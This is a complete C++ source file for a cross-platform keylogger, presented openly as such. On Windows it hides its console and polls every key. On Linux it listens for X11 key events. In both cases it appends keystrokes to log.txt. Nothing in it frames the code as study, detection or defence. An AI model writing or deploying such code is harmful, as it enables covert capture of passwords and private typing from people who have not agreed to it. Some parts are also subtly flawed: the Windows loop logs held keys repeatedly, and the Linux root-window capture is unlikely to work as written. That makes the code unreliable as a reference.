#include <iostream>
#include <fstream>

#ifdef _WIN32
#include <windows.h>
#else
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#endif

using namespace std;

// Function to save keypresses to a file
void Save(char key, const char *file) {
    static ofstream logFile(file, ios_base::app); // Open file in append mode (static to keep it open)
    
    if (logFile.is_open()) {
        logFile << key; // Write the character to the file
        logFile.flush(); // Ensure data is written to the file
    } else {
        cerr << "Error opening file for writing." << endl;
    }
}

#ifdef _WIN32
void WindowsKeylogger() {
    FreeConsole(); // Detach console window

    while (true) {
        Sleep(10); // Sleep to avoid high CPU usage
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) { // Check if key is pressed
                Save(static_cast<char>(i), "log.txt"); // Save keypress to file
            }
        }
    }
}
#else
void LinuxKeylogger() {
    Display *display = XOpenDisplay(NULL);
    if (display == NULL) {
        cerr << "Cannot open display" << endl;
        exit(1);
    }
    
    Window root = DefaultRootWindow(display);
    XSelectInput(display, root, KeyPressMask);
    
    XEvent event;
    while (true) {
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            char key = XLookupKeysym(&event.xkey, 0);
            Save(key, "log.txt"); // Save keypress to file
        }
    }
    
    XCloseDisplay(display);
}
#endif

int main() {
#ifdef _WIN32
    WindowsKeylogger(); // Call Windows-specific keylogger function
#else
    LinuxKeylogger(); // Call Linux-specific keylogger function
#endif
    return 0;
}
